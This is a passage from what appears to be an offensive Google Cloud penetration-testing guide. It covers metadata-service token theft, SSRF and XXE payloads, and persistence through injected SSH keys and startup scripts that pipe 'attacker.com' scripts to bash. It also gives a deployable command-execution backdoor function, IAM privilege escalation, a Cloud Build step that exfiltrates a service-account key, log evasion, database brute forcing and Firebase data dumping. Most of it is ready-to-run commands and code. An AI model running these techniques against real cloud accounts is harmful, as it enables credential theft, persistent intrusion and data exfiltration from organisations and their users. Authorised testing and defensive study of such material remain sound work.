TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  | jq -r '.access_token')

# Use token directly with API
curl -H "Authorization: Bearer $TOKEN" \
  https://storage.googleapis.com/storage/v1/b
```

#### Generate ID Tokens for Service-to-Service Auth

```bash
# Generate ID token for specific audience
gcloud auth print-identity-token --audiences=https://target-service.run.app

# Use with Cloud Functions/Cloud Run
curl -H "Authorization: Bearer $(gcloud auth print-identity-token)" \
  https://target-service.run.app/
```

---

## Compute Engine Metadata Service

### Metadata Service Exploitation Basics

The GCP metadata service is accessible from any Compute Engine instance at `http://metadata.google.internal/` or `http://169.254.169.254/`. Unlike AWS, GCP requires the custom header `Metadata-Flavor: Google`.

### Complete Metadata Enumeration

#### Instance Metadata

```bash
# Full instance metadata dump
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/?recursive=true | jq .

# Instance identity
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/id

# Hostname
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/hostname

# Zone
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/zone

# Machine type
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/machine-type

# Network interfaces
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/

# Tags
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/tags
```

#### Project Metadata

```bash
# Project ID
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id

# Project number
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# Project-wide SSH keys
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Project attributes
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true
```

#### Custom Metadata Extraction

```bash
# Instance-level custom metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/

# Specific custom attribute
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script

# Common sensitive attributes to check
for attr in startup-script startup-script-url shutdown-script credentials api-key database-password; do
  echo "Checking $attr:"
  curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/attributes/$attr"
  echo ""
done
```

### SSRF to Metadata Service Exploitation

#### Basic SSRF Payloads

```bash
# Standard metadata URL (requires header injection)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Alternative IP address
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Header injection attempts (application-dependent)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0d%0aMetadata-Flavor:%20Google

# URL encoding bypass
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

#### Advanced SSRF Techniques

**DNS Rebinding**

```bash
# Using tools like singularity or whonow
# Point domain to 127.0.0.1 initially, then rebind to 169.254.169.254

# Example with custom DNS server
# Configure DNS to respond with 169.254.169.254 after initial lookup
curl http://rebind.attacker.com/computeMetadata/v1/instance/service-accounts/default/token
```

**Header Injection via Various Vectors**

```bash
# CRLF injection in URL parameter
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0d%0aMetadata-Flavor:Google

# JSON payload with embedded headers (application-specific)
{"url": "http://metadata.google.internal/computeMetadata/v1/\nMetadata-Flavor: Google\n/instance/service-accounts/default/token"}

# XML external entity (XXE)
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>
<data>&xxe;</data>
```

#### Automated SSRF Exploitation

```bash
# SSRFmap tool
git clone https://github.com/swisskyrepo/SSRFmap.git
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus for protocol smuggling
git clone https://github.com/tarunkant/Gopherus.git
python gopherus.py --exploit gcs
```

### Token Theft and Abuse

#### Complete Token Extraction Workflow

```bash
# 1. Extract token via metadata service
TOKEN_DATA=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)

# 2. Parse token and expiry
ACCESS_TOKEN=$(echo $TOKEN_DATA | jq -r '.access_token')
EXPIRES_IN=$(echo $TOKEN_DATA | jq -r '.expires_in')
TOKEN_TYPE=$(echo $TOKEN_DATA | jq -r '.token_type')

echo "Token expires in: $EXPIRES_IN seconds"

# 3. Decode token to see scopes (JWT inspection)
echo $ACCESS_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# 4. Test token against various APIs
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://www.googleapis.com/oauth2/v1/tokeninfo
```

#### Using Stolen Tokens

```bash
# List GCS buckets
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID

# Access Compute Engine resources
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones/us-central1-a/instances

# Query Cloud SQL
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://sqladmin.googleapis.com/sql/v1beta4/projects/PROJECT_ID/instances

# Access Kubernetes Engine
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://container.googleapis.com/v1/projects/PROJECT_ID/zones/us-central1-a/clusters
```

### Persistence via Metadata

#### SSH Key Injection

```bash
# Add SSH key to instance metadata (requires permissions)
gcloud compute instances add-metadata INSTANCE_NAME \
  --metadata-from-file ssh-keys=new-ssh-keys.txt

# Format for ssh-keys.txt:
# username:ssh-rsa AAAAB3NzaC1yc2E... username@host

# Add via API with stolen token
curl -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_NAME/setMetadata \
  -d '{
    "items": [
      {
        "key": "ssh-keys",
        "value": "attacker:ssh-rsa AAAAB3NzaC1yc2E... attacker@host"
      }
    ]
  }'
```

#### Startup Script Modification

```bash
# Malicious startup script
cat > backdoor-startup.sh <<'EOF'
#!/bin/bash
curl http://attacker.com/backdoor.sh | bash
# Original startup script continues...
EOF

# Add to instance metadata
gcloud compute instances add-metadata INSTANCE_NAME \
  --metadata-from-file startup-script=backdoor-startup.sh
```

---

## Cloud Functions Security

### Cloud Functions Enumeration

#### Function Discovery

```bash
# List all functions in project (requires permissions)
gcloud functions list --project=PROJECT_ID

# List functions in specific region
gcloud functions list --region=us-central1

# Get function details
gcloud functions describe FUNCTION_NAME --region=REGION

# Using API with stolen token
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://cloudfunctions.googleapis.com/v1/projects/PROJECT_ID/locations/-/functions
```

#### Public Function Identification

```bash
# Check if function allows unauthenticated invocations
gcloud functions get-iam-policy FUNCTION_NAME --region=REGION

# Look for allUsers or allAuthenticatedUsers in output
# Indicates publicly accessible function

# Test direct invocation
curl https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME

# With data
curl -X POST https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME \
  -H "Content-Type: application/json" \
  -d '{"key":"value"}'
```

### Function Code Analysis

#### Source Code Extraction

```bash
# Download function source code (requires permissions)
gcloud functions describe FUNCTION_NAME --region=REGION --format=json | jq -r '.sourceArchiveUrl'

# Download from GCS if URL provided
gsutil cp gs://bucket-name/source.zip ./

# Alternative: download deployment package
gcloud functions describe FUNCTION_NAME --region=REGION --format=json > function-config.json
SOURCE_URL=$(cat function-config.json | jq -r '.sourceUploadUrl')
```

#### Common Vulnerability Patterns in Functions

**Command Injection**

```python
# Vulnerable Python Cloud Function
def vulnerable_function(request):
    import os
    user_input = request.args.get('cmd')
    # VULNERABLE: Direct command execution
    result = os.system(f"echo {user_input}")
    return f"Result: {result}"

# Exploitation
curl "https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME?cmd=;cat%20/proc/self/environ"
```

**Environment Variable Leakage**

```python
# Functions often contain secrets in environment variables
import os
def leak_secrets(request):
    return os.environ

# Exploitation if function is public or via SSRF
curl https://REGION-PROJECT_ID.cloudfunctions.net/leak_secrets
```

**Insecure Dependencies**

```bash
# Check requirements.txt or package.json for vulnerable versions
# Download function code and scan
safety check --file requirements.txt
npm audit
```

### Function Invocation and Testing

#### Authenticated Invocation

```bash
# Generate identity token for function invocation
ID_TOKEN=$(gcloud auth print-identity-token)

# Invoke function with authentication
curl https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME \
  -H "Authorization: Bearer $ID_TOKEN"

# Invoke via gcloud
gcloud functions call FUNCTION_NAME \
  --region=REGION \
  --data='{"key":"value"}'
```

#### IAM Policy Exploitation

```bash
# Add yourself as invoker (if you have setIamPolicy permission)
gcloud functions add-iam-policy-binding FUNCTION_NAME \
  --region=REGION \
  --member='user:attacker@gmail.com' \
  --role='roles/cloudfunctions.invoker'

# Make function public (requires permissions)
gcloud functions add-iam-policy-binding FUNCTION_NAME \
  --region=REGION \
  --member='allUsers' \
  --role='roles/cloudfunctions.invoker'
```

### Exploiting Function Service Accounts

#### Service Account Token Extraction

```python
# From within a Cloud Function
import google.auth
import google.auth.transport.requests

def get_token(request):
    credentials, project = google.auth.default()
    auth_req = google.auth.transport.requests.Request()
    credentials.refresh(auth_req)
    return credentials.token

# Or via metadata service (if network egress allowed)
import requests
def steal_token(request):
    headers = {'Metadata-Flavor': 'Google'}
    url = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
    response = requests.get(url, headers=headers)
    return response.json()
```

#### Privilege Escalation from Functions

```bash
# If function service account has elevated permissions:

# 1. Create compute instance with metadata containing backdoor
gcloud compute instances create backdoor \
  --service-account=FUNCTION_SA@PROJECT.iam.gserviceaccount.com \
  --metadata=startup-script='curl http://attacker.com/backdoor.sh | bash'

# 2. Access other GCP resources
# GCS buckets
curl -H "Authorization: Bearer $TOKEN" \
  https://storage.googleapis.com/storage/v1/b/sensitive-bucket/o

# 3. Lateral movement to other functions
curl -H "Authorization: Bearer $ID_TOKEN" \
  https://REGION-PROJECT_ID.cloudfunctions.net/OTHER_FUNCTION
```

### Function Backdooring

#### Deploy Malicious Function

```bash
# Create backdoor function
cat > backdoor_function.py <<'EOF'
import os
import subprocess

def backdoor(request):
    cmd = request.args.get('cmd', 'whoami')
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return {
        'stdout': result.stdout,
        'stderr': result.stderr,
        'env': dict(os.environ)
    }
EOF

# Deploy (requires permissions)
gcloud functions deploy backdoor \
  --runtime python39 \
  --trigger-http \
  --allow-unauthenticated \
  --entry-point backdoor \
  --region=us-central1
```

#### Modify Existing Function

```bash
# Download existing function source
gcloud functions describe FUNCTION_NAME --region=REGION

# Modify code to include backdoor
# Redeploy with modifications
gcloud functions deploy FUNCTION_NAME \
  --source=./modified-source \
  --runtime=python39 \
  --trigger-http \
  --region=REGION
```

### Cloud Functions Event Triggers Exploitation

#### Pub/Sub Trigger Abuse

```bash
# Publish message to trigger function (if you have permissions)
gcloud pubsub topics publish TOPIC_NAME \
  --message='{"malicious":"payload"}'

# Create subscription to intercept messages
gcloud pubsub subscriptions create attacker-sub \
  --topic=TOPIC_NAME

# Pull messages
gcloud pubsub subscriptions pull attacker-sub --auto-ack
```

#### Storage Trigger Exploitation

```bash
# Upload file to trigger Cloud Function
gsutil cp malicious-file.txt gs://trigger-bucket/

# Monitor function logs for execution
gcloud functions logs read FUNCTION_NAME --region=REGION --limit=50
```

### Defense Evasion and Logging

#### Disable Logging (if permissions allow)

```bash
# Update function with minimal logging
gcloud functions deploy FUNCTION_NAME \
  --no-allow-unauthenticated \
  --clear-env-vars \
  --update-labels stealth=true
```

#### Extract Credentials from Function Environment

```python
# Common environment variables in Cloud Functions
def extract_creds(request):
    import os
    sensitive_vars = {}
    
    # Common credential patterns
    patterns = ['KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'CREDENTIAL', 
                'DATABASE', 'API', 'OAUTH', 'PRIVATE']
    
    for key, value in os.environ.items():
        if any(pattern in key.upper() for pattern in patterns):
            sensitive_vars[key] = value
    
    return sensitive_vars
```

### Cloud Functions Networking Exploitation

#### VPC Connector Abuse

```bash
# If function has VPC connector, access internal resources
# Deploy function with VPC connector
gcloud functions deploy internal-scanner \
  --vpc-connector=projects/PROJECT_ID/locations/REGION/connectors/CONNECTOR_NAME \
  --egress-settings=private-ranges-only

# Function code to scan internal network
def internal_scan(request):
    import socket
    target = request.args.get('target')
    port = int(request.args.get('port', 22))
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((target, port))
    sock.close()
    
    return {'target': target, 'port': port, 'open': result == 0}
```

**Key Tools for GCP Security Testing:**

- **gcloud SDK** - Official CLI for GCP management
- **gsutil** - GCS bucket interaction
- **GCPBucketBrute** - Bucket enumeration
- **cloud_enum** - Multi-cloud resource discovery
- **ScoutSuite** - GCP security auditing (`pip install scoutsuite`)
- **gcp-iam-privilege-escalation** - Privilege escalation detection
- **Prowler** - GCP security assessment (`pip install prowler`)

**Important Subtopics:**

- Workload Identity Federation exploitation (GKE)
- Cloud Run container escape techniques
- Secret Manager enumeration and extraction
- Cloud Build pipeline manipulation
- BigQuery data exfiltration

---

## Cloud SQL Exposure

### Architecture & Attack Surface

Cloud SQL instances are fully managed database services (MySQL, PostgreSQL, SQL Server) that can be exposed through multiple attack vectors:

**Connection Methods:**

- Public IP exposure (direct internet access)
- Private IP via VPC peering
- Cloud SQL Proxy (secure tunnel)
- Authorized networks (IP whitelisting)

### Reconnaissance

**Identify Cloud SQL Instances:**

```bash
# List all Cloud SQL instances (requires authenticated gcloud)
gcloud sql instances list

# Describe specific instance details
gcloud sql instances describe INSTANCE_NAME

# Check public IP assignment
gcloud sql instances describe INSTANCE_NAME --format="get(ipAddresses)"
```

**Passive Discovery:**

- Cloud SQL instances use predictable hostnames: `PROJECT_ID:REGION:INSTANCE_NAME`
- DNS enumeration may reveal `*.cloudsql.com` subdomains
- Public IP ranges: Cloud SQL uses Google's public IP space

**Active Scanning:**

```bash
# Nmap scan for MySQL (3306) or PostgreSQL (5432)
nmap -p 3306,5432 -sV TARGET_IP

# Check SSL/TLS configuration
nmap -p 3306 --script ssl-cert,ssl-enum-ciphers TARGET_IP

# MySQL banner grabbing
nmap -p 3306 --script mysql-info TARGET_IP
```

### Exploitation Vectors

#### 1. Public IP Misconfiguration

**Common Misconfigurations:**

- Authorized networks set to `0.0.0.0/0` (allow all)
- Weak or default credentials
- SSL/TLS not enforced
- Legacy authentication methods enabled

**Testing Public Exposure:**

```bash
# Test MySQL connection
mysql -h TARGET_IP -u root -p

# Test PostgreSQL connection
psql -h TARGET_IP -U postgres -d postgres

# Enumerate users (MySQL)
mysql -h TARGET_IP -u root -p -e "SELECT user, host FROM mysql.user;"

# Check authentication requirements
mysql -h TARGET_IP --ssl-mode=DISABLED -u root
```

#### 2. Credential-Based Attacks

**Default/Weak Credentials:**

```bash
# Common default usernames for Cloud SQL
# MySQL: root, admin, mysql
# PostgreSQL: postgres, cloudsqlsuperuser
# SQL Server: sqlserver, sa

# Brute force attack using Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET_IP

# PostgreSQL brute force
hydra -l postgres -P passwords.txt postgres://TARGET_IP
```

**Credential Spraying:**

```bash
# Using Metasploit for MySQL
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS TARGET_IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

#### 3. SQL Injection via Application

When applications use Cloud SQL backends, standard SQL injection techniques apply:

```bash
# SQLMap against web application
sqlmap -u "https://target.com/page?id=1" --dbs --batch

# Enumerate Cloud SQL specific details
sqlmap -u "https://target.com/page?id=1" --sql-query="SELECT @@version"

# PostgreSQL specific enumeration
sqlmap -u "https://target.com/page?id=1" --sql-query="SELECT version()"
```

### Data Exfiltration

**MySQL Data Export:**

```bash
# Dump entire database
mysqldump -h TARGET_IP -u USER -p DATABASE > dump.sql

# Export specific table
mysqldump -h TARGET_IP -u USER -p DATABASE TABLE > table_dump.sql

# Export with compression
mysqldump -h TARGET_IP -u USER -p DATABASE | gzip > dump.sql.gz
```

**PostgreSQL Data Export:**

```bash
# Dump database
pg_dump -h TARGET_IP -U USER -d DATABASE -f dump.sql

# Export as CSV
psql -h TARGET_IP -U USER -d DATABASE -c "COPY table TO STDOUT CSV HEADER" > data.csv
```

### Privilege Escalation within Database

**MySQL Privilege Escalation:**

```sql
-- Check current privileges
SHOW GRANTS FOR CURRENT_USER();

-- Attempt to read files (if FILE privilege exists)
SELECT LOAD_FILE('/etc/passwd');

-- Write files (requires FILE privilege and secure_file_priv not set)
SELECT 'malicious content' INTO OUTFILE '/tmp/shell.php';

-- Create new privileged user
CREATE USER 'attacker'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
```

**PostgreSQL Privilege Escalation:**

```sql
-- Check current role
SELECT current_user, session_user;

-- List all databases and privileges
\l+

-- Read files (requires superuser or pg_read_server_files role)
SELECT pg_read_file('/etc/passwd');

-- Execute commands (if appropriate extensions available)
COPY (SELECT '') TO PROGRAM 'whoami';
```

### Detection & Monitoring Evasion

**Slow Query Techniques:**

```bash
# Use delay functions to avoid triggering rate limits
# MySQL
SELECT SLEEP(5), user FROM mysql.user;

# PostgreSQL
SELECT pg_sleep(5);
```

**Connection Throttling:**

```python
# Python script for rate-limited enumeration
import mysql.connector
import time

for table in tables:
    conn = mysql.connector.connect(host=TARGET, user=USER, password=PASS)
    cursor = conn.cursor()
    cursor.execute(f"SELECT COUNT(*) FROM {table}")
    result = cursor.fetchone()
    conn.close()
    time.sleep(30)  # Wait to avoid detection
```

### Defensive Reconnaissance

**Check Instance Configuration:**

```bash
# Verify SSL enforcement
gcloud sql instances describe INSTANCE_NAME --format="get(settings.ipConfiguration.requireSsl)"

# Check authorized networks
gcloud sql instances describe INSTANCE_NAME --format="get(settings.ipConfiguration.authorizedNetworks)"

# List database flags (security settings)
gcloud sql instances describe INSTANCE_NAME --format="get(settings.databaseFlags)"
```

---

## IAM Privilege Escalation

### GCP IAM Fundamentals

**IAM Structure:**

- **Resources**: Projects, folders, organizations, specific GCP resources
- **Identities**: User accounts, service accounts, groups, domains
- **Roles**: Collections of permissions (primitive, predefined, custom)
- **Bindings**: Relationship between identity and role on a resource

### Reconnaissance

**Enumerate Current Permissions:**

```bash
# Check current authenticated identity
gcloud auth list

# Get current project
gcloud config get-value project

# List IAM policy for current project
gcloud projects get-iam-policy PROJECT_ID

# Test specific permissions
gcloud projects get-iam-policy PROJECT_ID --flatten="bindings[].members" --filter="bindings.members:USER_EMAIL"

# List service accounts in project
gcloud iam service-accounts list

# Describe specific service account
gcloud iam service-accounts describe SA_EMAIL
```

**Enumerate Available Resources:**

```bash
# List all accessible projects
gcloud projects list

# List compute instances
gcloud compute instances list --project=PROJECT_ID

# List storage buckets
gcloud storage ls --project=PROJECT_ID

# List Cloud Functions
gcloud functions list --project=PROJECT_ID
```

**Test Permission Boundaries:**

```bash
# Use testIamPermissions to check specific permissions
gcloud projects test-iam-permissions PROJECT_ID \
  --permissions="compute.instances.create,iam.serviceAccounts.actAs"

# Test resource-specific permissions
gcloud compute instances test-iam-permissions INSTANCE_NAME \
  --zone=ZONE \
  --permissions="compute.instances.get,compute.instances.setMetadata"
```

### Privilege Escalation Paths

#### 1. Service Account Impersonation

**Method: iam.serviceAccounts.actAs + Privileged Resource Creation**

[Inference: This technique requires the combination of actAs permission and resource creation permissions]

```bash
# Check if you can impersonate a service account
gcloud iam service-accounts get-iam-policy SA_EMAIL

# Create compute instance with privileged service account
gcloud compute instances create escalation-vm \
  --zone=us-central1-a \
  --service-account=SA_EMAIL \
  --scopes=cloud-platform

# SSH into instance and extract service account token
gcloud compute ssh escalation-vm --zone=us-central1-a
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

**Method: iam.serviceAccounts.getAccessToken**

```bash
# Directly generate access token for service account
gcloud iam service-accounts get-access-token SA_EMAIL

# Use token with gcloud
gcloud config set auth/access_token_file token.txt
gcloud projects list
```

**Method: iam.serviceAccounts.signBlob + signJwt**

```bash
# Create JWT for service account
gcloud iam service-accounts sign-jwt input.json output.jwt SA_EMAIL

# Use JWT to authenticate
gcloud auth activate-service-account SA_EMAIL --key-file=output.jwt
```

#### 2. IAM Policy Modification

**Method: setIamPolicy Permission**

```bash
# Get current IAM policy
gcloud projects get-iam-policy PROJECT_ID --format=json > policy.json

# Modify policy to add yourself as Owner
# Edit policy.json to add:
# {
#   "members": ["user:attacker@example.com"],
#   "role": "roles/owner"
# }

# Apply modified policy
gcloud projects set-iam-policy PROJECT_ID policy.json
```

**Method: iam.roles.update (Custom Role Modification)**

```bash
# List custom roles
gcloud iam roles list --project=PROJECT_ID

# Get role definition
gcloud iam roles describe ROLE_ID --project=PROJECT_ID --format=json > role.json

# Add dangerous permissions (e.g., iam.serviceAccountKeys.create)
# Edit role.json to add permissions

# Update role
gcloud iam roles update ROLE_ID --project=PROJECT_ID --file=role.json
```

#### 3. Metadata Server Exploitation

**From Compute Instance:**

```bash
# Get access token from metadata server
TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" | jq -r '.access_token')

# Get service account email
SA_EMAIL=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google")

# Use token for API calls
curl -H "Authorization: Bearer $TOKEN" \
  https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones/us-central1-a/instances
```

**From Cloud Functions:**

```python
# Python Cloud Function to extract credentials
import requests
import os

def exploit_function(request):
    metadata_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    headers = {"Metadata-Flavor": "Google"}
    response = requests.get(metadata_url, headers=headers)
    return response.json()
```

#### 4. Cloud Build Privilege Escalation

**Method: cloudbuild.builds.create Permission**

[Inference: Cloud Build runs with a service account that often has elevated permissions]

```yaml
# cloudbuild.yaml - malicious build configuration
steps:
- name: 'gcr.io/cloud-builders/gcloud'
  args:
  - 'projects'
  - 'get-iam-policy'
  - 'PROJECT_ID'
  
- name: 'gcr.io/cloud-builders/gcloud'
  entrypoint: 'bash'
  args:
  - '-c'
  - |
    gcloud iam service-accounts keys create key.json \
      --iam-account=PRIVILEGED_SA@PROJECT_ID.iam.gserviceaccount.com
    gsutil cp key.json gs://exfil-bucket/
```

```bash
# Submit malicious build
gcloud builds submit --config=cloudbuild.yaml
```

#### 5. Deployment Manager Exploitation

**Method: deploymentmanager.deployments.create**

```yaml
# deployment.yaml - create privileged resources
resources:
- name: escalation-instance
  type: compute.v1.instance
  properties:
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/n1-standard-1
    serviceAccounts:
    - email: PRIVILEGED_SA@PROJECT_ID.iam.gserviceaccount.com
      scopes:
      - https://www.googleapis.com/auth/cloud-platform
    disks:
    - deviceName: boot
      boot: true
      autoDelete: true
      initializeParams:
        sourceImage: projects/debian-cloud/global/images/family/debian-11
    networkInterfaces:
    - network: global/networks/default
      accessConfigs:
      - name: External NAT
        type: ONE_TO_ONE_NAT
```

```bash
# Deploy configuration
gcloud deployment-manager deployments create escalation \
  --config=deployment.yaml
```

#### 6. Organization Policy Bypass

**Method: orgpolicy.policy.set Permission**

```bash
# List organization policies
gcloud org-policies list --project=PROJECT_ID

# Disable domain restriction policy (allows external users)
cat > policy.yaml <<EOF
constraint: iam.allowedPolicyMemberDomains
listPolicy:
  allValues: ALLOW
EOF

gcloud org-policies set-policy policy.yaml --project=PROJECT_ID
```

### Advanced Escalation Techniques

#### Service Account Key Creation

```bash
# Create key for service account you have access to
gcloud iam service-accounts keys create key.json \
  --iam-account=SA_EMAIL

# Activate service account locally
gcloud auth activate-service-account --key-file=key.json

# Use service account credentials
export GOOGLE_APPLICATION_CREDENTIALS=key.json
```

#### Cross-Project Escalation

**Method: resourcemanager.projects.setIamPolicy on Folder/Org Level**

[Inference: Permissions at folder or organization level can grant access to multiple projects]

```bash
# List folders (if you have access at org level)
gcloud resource-manager folders list --organization=ORG_ID

# Get folder IAM policy
gcloud resource-manager folders get-iam-policy FOLDER_ID

# Add yourself to folder-level IAM
gcloud resource-manager folders add-iam-policy-binding FOLDER_ID \
  --member="user:attacker@example.com" \
  --role="roles/owner"
```

#### Workload Identity Exploitation (GKE)

```bash
# From pod with workload identity enabled
# Service account token is automatically mounted
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use kubectl to access cluster
kubectl auth can-i --list

# Access Google Cloud APIs using workload identity
curl -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones
```

### Post-Exploitation

**Maintain Access:**

```bash
# Create new service account
gcloud iam service-accounts create backdoor-sa \
  --display-name="Backup Service Account"

# Grant owner role
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="serviceAccount:backdoor-sa@PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/owner"

# Create key for persistence
gcloud iam service-accounts keys create backdoor-key.json \
  --iam-account=backdoor-sa@PROJECT_ID.iam.gserviceaccount.com
```

**Cover Tracks:**

```bash
# Cloud Audit Logs are immutable, but you can disable logging for future actions
# [Unverified: Effectiveness depends on existing logging configuration]

# Disable Data Access audit logs (requires logging.admin)
gcloud logging sinks create no-audit-sink \
  storage.googleapis.com/dev-null-bucket \
  --log-filter='protoPayload.methodName="storage.objects.get"'
```

---

## Firebase Misconfiguration

### Firebase Architecture

**Firebase Services:**

- **Realtime Database**: NoSQL JSON database
- **Cloud Firestore**: Document database
- **Authentication**: User authentication service
- **Cloud Storage**: Object storage
- **Cloud Functions**: Serverless functions
- **Hosting**: Static web hosting

### Reconnaissance

**Identify Firebase Usage:**

```bash
# Check web application source code
curl https://target.com | grep -i firebase

# Look for Firebase configuration in JavaScript
curl https://target.com/js/app.js | grep -E '(apiKey|projectId|messagingSenderId)'

# Common Firebase config pattern
# apiKey: "AIza..."
# authDomain: "project-id.firebaseapp.com"
# databaseURL: "https://project-id.firebaseio.com"
# projectId: "project-id"
# storageBucket: "project-id.appspot.com"
```

**Extract Firebase Configuration:**

```javascript
// From browser console on target site
console.log(firebase.app().options)

// Or search for _getFirebaseConfig in JavaScript files
```

**Manual Source Code Inspection:**

```bash
# Download all JavaScript files
wget -r -l 1 -H -t 1 -nd -N -np -A js -erobots=off https://target.com

# Search for Firebase references
grep -r "firebaseio.com\|firestore.googleapis.com" .
```

### Realtime Database Exploitation

#### 1. Unauthenticated Read Access

**Test Database Rules:**

```bash
# Direct database URL access
curl "https://PROJECT_ID.firebaseio.com/.json"

# Access specific path
curl "https://PROJECT_ID.firebaseio.com/users.json"

# Use print parameter for formatted output
curl "https://PROJECT_ID.firebaseio.com/.json?print=pretty"
```

**Recursive Enumeration:**

```python
# Python script to recursively dump Firebase database
import requests
import json

def dump_firebase(url, path=""):
    full_url = f"{url}/{path}.json"
    response = requests.get(full_url)
    
    if response.status_code == 200:
        data = response.json()
        if isinstance(data, dict):
            for key in data.keys():
                dump_firebase(url, f"{path}/{key}" if path else key)
        return data
    return None

database_url = "https://PROJECT_ID.firebaseio.com"
data = dump_firebase(database_url)
with open('firebase_dump.json', 'w') as f:
    json.dump(data, f, indent=2)
```

#### 2. Unauthenticated Write Access

**Test Write Permissions:**

```bash
# POST request to create data
curl -X POST "https://PROJECT_ID.firebaseio.com/test.json" \
  -d '{"pwned": "true"}'

# PUT request to overwrite data
curl -X PUT "https://PROJECT_ID.firebaseio.com/test.json" \
  -d '{"pwned": "overwritten"}'

# PATCH request to update data
curl -X PATCH "https://PROJECT_ID.firebaseio.com/test.json" \
  -d '{"additional": "field"}'

# DELETE request
curl -X DELETE "https://PROJECT_ID.firebaseio.com/test.json"
```

#### 3. Authentication Bypass

**Common Misconfiguration Patterns:**

[Inference: Firebase security rules may have logic flaws allowing bypass]

```javascript
// Vulnerable rule example (DO NOT USE IN PRODUCTION)
{
  "rules": {
    ".read": "auth != null",  // Any authenticated user can read
    ".write": "auth.uid == $uid"  // Only checks UID match
  }
}
```

**Exploitation:**

```bash
# Register new account using Firebase Auth API
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "password123",
    "returnSecureToken": true
  }'

# Use returned idToken for authenticated requests
curl "https://PROJECT_ID.firebaseio.com/sensitive.json?auth=ID_TOKEN"
```

#### 4. Path Traversal in Rules

```javascript
// Vulnerable rule with path traversal potential
{
  "rules": {
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",
        ".write": "$uid === auth.uid"
      }
    }
  }
}
```

**Exploitation Attempt:**

```bash
# Try to access data using path manipulation
# [Unverified: Effectiveness depends on specific rule implementation]
curl "https://PROJECT_ID.firebaseio.com/users/../admin.json?auth=ID_TOKEN"
```

### Cloud Firestore Exploitation

#### 1. Unauthenticated Access via REST API

**Access Firestore REST API:**

```bash
# List collections (requires API key)
curl "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents?key=API_KEY"

